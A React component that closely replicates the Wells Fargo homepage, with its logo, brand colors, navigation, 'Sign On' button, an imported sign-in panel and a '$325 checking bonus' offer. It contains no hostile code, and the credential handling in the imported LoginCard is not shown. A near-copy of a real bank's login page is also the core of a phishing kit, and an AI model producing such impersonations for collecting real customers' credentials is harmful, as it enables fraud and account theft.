import { useState } from "react";
import navlogo from "../assets/wflogo.webp";
import Login from "../components/LoginCard";
import { Link } from "react-router-dom";
const mainNavItems = [
  "Personal",
  "Investing & Wealth Management",
  "Business",
  "Commercial Banking",
  "Corporate & Investment Banking",
  "About Wells Fargo",
];

const subNavItems = [
  "Checking",
  "Savings & CDs",
  "Credit Cards",
  "Home Loans",
  "Personal Loans",
  "Auto Loans",
  "Premier",
  "Education & Tools",
];

export default function WellsFargoHomepage() {
  const [activeNav, setActiveNav] = useState("Personal");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);

  return (
    <div className="font-sans bg-[#f5f0eb] min-h-screen">

      {/* Top Bar */}
      <div className="bg-[#c0272d] flex items-center justify-between px-6 h-14">
       <img src={navlogo} alt="" />
        <div className="flex items-center gap-5">
          {["ATMs/Locations", "Help", "Español"].map((item) => (
            <span key={item} className="text-white text-sm cursor-pointer hover:underline">
              {item}
            </span>
          ))}
          <span className="text-white text-lg cursor-pointer select-none">&#128269;</span>
          <button className="bg-white text-[#c0272d] rounded-full px-4 py-1.5 text-sm font-bold hover:bg-gray-100 transition-colors cursor-pointer">
            Sign On
          </button>
        </div>
      </div>

      {/* Main Nav */}
      <div className="bg-white border-b border-gray-200 px-6 flex gap-8 overflow-x-auto">
        {mainNavItems.map((item) => (
          <span
            key={item}
            onClick={() => setActiveNav(item)}
            className={`py-3.5 text-sm cursor-pointer whitespace-nowrap border-b-2 transition-colors ${
              activeNav === item
                ? "border-[#c0272d] text-[#c0272d] font-bold"
                : "border-transparent text-gray-700 hover:text-[#c0272d]"
            }`}
          >
            {item}
          </span>
        ))}
      </div>

      {/* Sub Nav */}
      <div className="bg-white border-b border-gray-200 px-6 flex gap-6 overflow-x-auto">
        {subNavItems.map((item) => (
          <span
            key={item}
            className="py-2.5 text-sm text-gray-700 cursor-pointer hover:text-[#c0272d] whitespace-nowrap"
          >
            {item}
          </span>
        ))}
      </div>

      {/* Body */}
      <div className="flex min-h-[460px] p-5">

        {/* Sign-in Panel */}
       <Login/>
        {/* Hero Section */}
        <div className="flex-1 flex items-center px-12 py-10 gap-10">
          <div>
            <h1 className="text-5xl font-light text-gray-900 leading-tight mb-4 max-w-sm">
              $325 checking bonus on us
            </h1>
            <p className="text-base text-gray-600 max-w-sm mb-6 leading-relaxed">
              New customers open an eligible checking account with qualifying direct deposits
            </p>
            <Link to="/signup" className="border border-gray-500 rounded-full px-7 py-2.5 text-sm text-gray-800 bg-transparent hover:bg-[#e8e1d8] transition-colors cursor-pointer">
              Get started &gt;&gt;
            </Link>
          </div>

          {/* Offer Badge */}
          <div className="ml-auto flex flex-col items-end">
            <div className="w-16 h-0.5 bg-[#9c1c6e] mb-2" />
            <p className="text-lg text-gray-700 font-normal leading-none mt-1">Enjoy</p>
            <div className="text-8xl font-bold text-[#9c1c6e] leading-none mt-1">
              <span className="text-4xl align-super">$</span>325
            </div>
            <div className="w-16 h-0.5 bg-[#9c1c6e] mt-3" />
          </div>
        </div>

      </div>
    </div>
  );
}